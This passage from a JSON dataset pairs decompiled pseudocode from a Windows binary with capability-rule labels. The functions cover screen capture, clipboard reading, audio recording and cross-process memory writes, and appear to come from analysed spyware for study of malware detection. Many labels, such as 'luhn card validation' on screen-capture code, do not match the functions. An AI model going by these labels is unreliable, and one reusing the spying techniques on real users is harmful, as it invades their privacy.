        "decompiled_code": "\nvoid __cdecl fcn.0049047c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStackY156;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_20h;\n    \n    puStack108 = &stack0xfffffffc;\n    uStack112 = 0x490578;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack116;\n    var_48h = 0x48;\n    iVar1 = sub.user32.dll_GetMonitorInfoA(arg_8h, &var_48h);\n    uVar2 = iVar1 == 0;\n    if (!uVar2) {\n        fcn.004056dc();\n        fcn.00405894();\n        if (uVar2) {\n            *0x4ad47c = var_44h;\n            *0x4ad480 = var_40h;\n            fcn.00409c6c(0x490590);\n            fcn.00409c6c(0x4905a0, 0);\n            fcn.00409c6c(0x4905a0, 0);\n            fcn.00409c6c(0x4905a0, 0);\n            uStackY156 = 0;\n            fcn.00405800();\n            fcn.004938a4();\n        }\n    }\n    *in_FS_OFFSET = uStackY156;\n    fcn.00405490(0x49057f);\n    return;\n}\n",
        "token_count": 416
    },
    "004907fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004907fc(int32_t param_1)\n\n{\n    int32_t **in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x490813;\n    fcn.004058ec();\n    uStack28 = 0x49090c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    uStack36 = 0;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 0x49082f;\n    puStack24 = &stack0xfffffffc;\n    uStack48 = fcn.004058fc();\n    puStack52 = 0x490835;\n    uVar1 = sub.gdi32.dll_CreateDCA();\n    uStack56 = 0x4908ef;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.0042d1b4();\n    fcn.0042881c();\n    (**(**in_EAX + 0x40))();\n    (**(**in_EAX + 0x34))();\n    fcn.0042d1b4(0, 0, *0x4ad484, *0x4ad488, uVar1, 0, 0, 0xcc0020);\n    uVar2 = fcn.00428b60();\n    sub.gdi32.dll_BitBlt();\n    if (param_1 != 100) {\n        fcn.00446474();\n    }\n    fcn.0042d1b4();\n    fcn.00428a54();\n    *in_FS_OFFSET = uVar2;\n    sub.user32.dll_ReleaseDC(0, uVar1, 0x4908f6);\n    return;\n}\n",
        "token_count": 500
    },
    "00493508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.00493508(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x49351b;\n    fcn.004058ec();\n    uStack28 = 0x4935ae;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.004054c0();\n    fcn.004054c0();\n    fcn.004054c0();\n    fcn.004054c0();\n    fcn.004054c0();\n    uVar1 = sub.kernel32.dll_CreateThread(0, 0, fcn.00490f58, uVar1, 0, &fcn.00493508::var_8h);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.0040546c(0x4935b5);\n    return;\n}\n",
        "token_count": 276
    },
    "0049d2f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0049d2f4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uchar uVar4;\n    float10 fVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x4a5114;\n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack68 = 0x49d506;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack72;\n    fcn.0048f52c(**0x4a4fa8);\n    fcn.00409a78(0);\n    fcn.00405800(0);\n    **0x4a4e70 = 0;\n    **0x4a50b0 = 0;\n    **0x4a5110 = 0;\n    bVar3 = true;\n    **0x4a5000 = 0;\n    fcn.00405894();\n    if (bVar3) {\n        sub.kernel32.dll_CreateThread(0, 0, 0x4890a8, 0, 0, *0x4a5094);\n        **0x4a4ccc = 1;\n    }\n    sub.kernel32.dll_CreateThread(0, 0, 0x492ec4, 0, 0, &var_10h);\n    **0x4a4c8c = 1;\n    fcn.0040669c();\n    uVar4 = 1;\n    fcn.00403ae4();\n    fcn.0049d160();\n    fcn.004068a0();\n    fcn.0048f554();\n    fcn.004054c0();\n    fcn.00405894();\n    if (uVar4) {\n        fVar5 = fcn.0040bb94();\n        var_14h = fVar5 >> 0x20;\n        var_18h = SUB84(fVar5, 0);\n        fcn.0040c7f4(var_18h, var_14h);\n        fVar5 = fcn.0040bbc0();\n        var_1ch = fVar5 >> 0x20;\n        var_20h = SUB84(fVar5, 0);\n        fcn.0040c7f4(var_20h, var_1ch);\n        fcn.00405800(var_8h, 0x49d53c, var_4h);\n    }\n    uVar8 = 0;\n    sub.kernel32.dll_CreateThread(0, 0, fcn.00493a30, 0, 0, *0x4a5094);\n    while( true ) {\n        uVar7 = 0;\n        uVar6 = uVar1;\n        iVar2 = sub.user32.dll_GetMessageA(uVar1, 0, 0, 0);\n        if (iVar2 == 0) break;\n        sub.user32.dll_TranslateMessage(uVar1);\n        uVar8 = uVar1;\n        sub.user32.dll_DispatchMessageA();\n    }\n    *in_FS_OFFSET = uVar6;\n    fcn.0040546c(0x49d50d, uVar7, uVar8);\n    fcn.00406864();\n    fcn.00405490();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 877
    },
    "0049d584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.0049d584(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x49d59f;\n    fcn.004058ec();\n    uStack32 = 0x49d615;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(10);\n    uVar1 = sub.kernel32.dll_FindResourceA(0, uVar1);\n    uVar2 = sub.kernel32.dll_LoadResource(0, uVar1);\n    sub.kernel32.dll_SizeofResource(0, uVar1);\n    sub.kernel32.dll_LockResource(uVar2);\n    fcn.0040555c();\n    fcn.004054c0();\n    sub.kernel32.dll_FreeResource();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x49d61c);\n    return;\n}\n",
        "token_count": 264
    },
    "0049d624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0049d624(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint arg_8h;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x49d6c6;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    arg_8h = 0x40;\n    puStackY32 = 0x49d649;\n    fcn.0040f130();\n    puStackY32 = 0x49d658;\n    var_4h = fcn.0041b940(arg_8h);\n    uStackY36 = 0x49d6a9;\n    uStackY40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStackY32 = &stack0xfffffffc;\n    (***var_4h)();\n    fcn.00405b8c();\n    (***var_4h)();\n    fcn.0041b6b8();\n    *in_FS_OFFSET = uStackY40;\n    puStackY32 = 0x49d6b0;\n    uStackY36 = 0x49d6a8;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 345
    },
    "0049d90c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0049d90c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 4;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00409c6c();\n    return;\n}\n",
        "token_count": 65
    },
    "0049db20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "find graphical window",
            "write process memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0049db20(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uVar6;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t wParam;\n    uint hWndParent;\n    uint lpdwProcessId;\n    uint lpNumberOfBytesWritten;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack72 = 0x49db4b;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack72 = 0x49db53;\n    fcn.004058ec();\n    uStack76 = 0x49dd27;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.0049daa4();\n    uVar1 = fcn.004058fc();\n    uVar1 = sub.user32.dll_FindWindowA(0x49dd38, uVar1);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x49dd38, 0);\n    uVar2 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x49dd40, 0);\n    uVar1 = uVar2;\n    var_20h = sub.user32.dll_SendMessageA(uVar2, 0x1004, 0, 0);\n    if (-1 < var_20h + -1) {\n        wParam = 0;\n        do {\n            puVar3 = sub.kernel32.dll_VirtualAlloc_1(0, 300, 0x3000, 4);\n            sub.user32.dll_GetWindowThreadProcessId(uVar2, &fcn.0049db20::lpdwProcessId);\n            uVar1 = sub.kernel32.dll_OpenProcess(0x38, 0, lpdwProcessId);\n            iVar4 = sub.kernel32.dll_VirtualAllocEx(uVar1, 0, 300, 0x3000, 4);\n            *puVar3 = 1;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[5] = iVar4 + 0x28;\n            puVar3[6] = 100;\n            sub.kernel32.dll_WriteProcessMemory(uVar1, iVar4, puVar3, 0x400, &fcn.0049db20::lpNumberOfBytesWritten);\n            sub.user32.dll_SendMessageA(uVar2, 0x102d, wParam, iVar4);\n            uVar6 = uVar1;\n            sub.kernel32.dll_ReadProcessMemory();\n            uVar5 = puVar3 == 0xffffffd8;\n            fcn.00405664();\n            fcn.00409a78();\n            fcn.00409a78(0);\n            fcn.00405894();\n            if (uVar5) {\ncode_r0x0049dcbe:\n                uVar6 = uVar2;\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                fcn.00409a78();\n                fcn.00409a78(0);\n                fcn.00405894();\n                if (uVar5) goto code_r0x0049dcbe;\n            }\n            sub.kernel32.dll_VirtualFree_1(puVar3, 0, 0x8000, uVar6);\n            sub.kernel32.dll_VirtualFreeEx(uVar1, iVar4, 0, 0x8000);\n            sub.kernel32.dll_CloseHandle_1();\n            wParam = wParam + 1;\n            var_20h = var_20h + -1;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x49dd2e);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 968
    },
    "00420600": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420600(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420663;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 291
    },
    "00428618": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00428618(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a0c();\n    fcn.00419994();\n    fcn.00428be8();\n    fcn.00404640();\n    fcn.00404640();\n    fcn.00404640();\n    sub.kernel32.dll_DeleteCriticalSection(iVar1 + 0x38);\n    fcn.00419b8c();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004287a8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004287a8(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00428c3c();\n    uVar1 = fcn.00428438();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 111
    },
    "00428870": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428870(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.00428c3c();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0042aa94": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042aa94(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        fcn.00404640();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.00404854();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.00404854();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "00434404": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00434404(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1b4) = puVar1;\n    *puVar1 = 0x43431c;\n    puVar1[1] = 0x4343c8;\n    puVar1[2] = fcn.004342d4;\n    puVar1[3] = 0x43430c;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    puVar1[6] = 1;\n    return;\n}\n",
        "token_count": 157
    },
    "0043fe6c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0043fe6c(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x158) = puVar1;\n    *puVar1 = 0x43fc10;\n    puVar1[1] = 0x43fc50;\n    puVar1[2] = 0x43fd28;\n    puVar1[3] = 0x43fde8;\n    puVar1[4] = 0x43fdf4;\n    puVar1[5] = 0x43fbd0;\n    puVar1[6] = 0x43fc08;\n    puVar1[7] = 0;\n    return;\n}\n",
        "token_count": 180
    },
    "0045bf44": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045bf44(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 8) = *(param_2 + 8);\n    *(in_EAX + 0xc) = *(param_2 + 0xc);\n    *(in_EAX + 0x10) = *(param_2 + 0x10);\n    *(in_EAX + 0x14) = *(param_2 + 0x14);\n    *(in_EAX + 0x18) = *(param_2 + 0x18);\n    *(in_EAX + 0x1c) = *(param_2 + 0x1c);\n    *(in_EAX + 0x28) = *(param_2 + 0x28);\n    *(in_EAX + 0x2c) = *(param_2 + 0x2c);\n    *(in_EAX + 0x30) = *(param_2 + 0x30);\n    *(in_EAX + 0x34) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 255
    },
    "004631b4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004631b4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0040847c(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x1b4) = uVar1;\n    return;\n}\n",
        "token_count": 156
    },
    "0047f27c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * fcn.0047f27c(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.00402ef0();\n    fcn.0047ebb4();\n    uVar2 = fcn.00402ef0();\n    *puVar1 = uVar2;\n    puVar1[1] = *(in_EAX + 0xc);\n    puVar1[2] = 0;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    iVar3 = sub.winmm.dll_waveInPrepareHeader(*(in_EAX + 0x94), puVar1, 0x20);\n    if (iVar3 == 0) {\n        sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), puVar1, 0x20);\n    }\n    return puVar1;\n}\n",
        "token_count": 216
    },
    "00403760": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00403760(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00403ae4();\n    *(in_EAX + 0x14) = in_EAX + 0x14c;\n    *(in_EAX + 4) = 0xd7b0;\n    *(in_EAX + 6) = *0x4a1034;\n    *(in_EAX + 8) = 0x80;\n    *(in_EAX + 0x18) = 0x4035b4;\n    uVar1 = fcn.0040572c();\n    fcn.004058fc(uVar1);\n    fcn.004030ec();\n    iVar2 = fcn.0040572c();\n    *(in_EAX + 0x48 + iVar2) = 0;\n    return 0;\n}\n",
        "token_count": 202
    },
    "004052bc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.004052bc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x4a1000;\n    *0x4a1000 = 0;\n    puVar3 = *0x4a87c8;\n    puVar4 = 0x4a87c8;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 176
    },
    "0040f65c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f65c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x14), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 56
    },
    "00423558": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423558(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x423648;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_14h = 0;\n    fcn.00406f3c();\n    iVar1 = sub.oleaut32.dll_GetErrorInfo();\n    if (iVar1 == 0) {\n        fcn.00405c48();\n        (**(_pe_dos_header + 0x10))();\n        fcn.00405c48();\n        (**(_pe_dos_header + 0x14))();\n        fcn.00405c48();\n        (**(_pe_dos_header + 0x18))();\n        uStack96 = 0;\n        uStack100 = 0x4235d5;\n        (**(_pe_dos_header + 0x1c))();\n    }\n    fcn.004056f4();\n    fcn.004056f4();\n    fcn.004056f4();\n    iStack104 = fcn.00422ef4(var_14h, var_1ch, var_18h, in_EAX);\n    uStack108 = var_14h;\n    if (iStack104 == 0) {\n        iStack104 = fcn.00405460();\n        uStack108 = var_14h;\n    }\n    uStack96 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4a6014)(0xeedfade, 1, 7, &stack0xffffff94);\n    return;\n}\n",
        "token_count": 530
    },
    "0042ab10": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ab10(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x42ab2b;\n        iVar1 = fcn.00404518();\n        piStack24 = 0x42ab30;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x42ab3d;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x42ab4f;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404854();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x42ab67;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404854();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x42aba0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00404640();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.0040483c();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 385
    },
    "004331a0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.004331a0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((in_EAX[5] < 0xca) || (0xd2 < in_EAX[5])) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    return *(in_EAX[0x6d] + 0x10);\n}\n",
        "token_count": 126
    },
    "00433284": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433284(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    iVar1 = *in_EAX;\n    *(iVar1 + 0x14) = 0x36;\n    *(iVar1 + 0x18) = param_2;\n    (***in_EAX)();\n    return;\n}\n",
        "token_count": 89
    },
    "00469924": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469924(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.00468dec();\n    fcn.00469184();\n    return;\n}\n",
        "token_count": 429
    },
    "0047e2f0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047e2f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x47e304;\n    (**(*in_EAX + 0x18))();\n    uStack28 = 0x47e348;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(2);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x47e34f);\n    return;\n}\n",
        "token_count": 220
    },
    "0047e358": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047e358(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x47e36b;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x47e3ad;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(3);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x47e3b4);\n    return;\n}\n",
        "token_count": 221
    },
    "0045c3cc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0045c3cc(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f) < (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f)) {\n        return in_EAX;\n    }\n    return param_2;\n}\n",
        "token_count": 109
    },
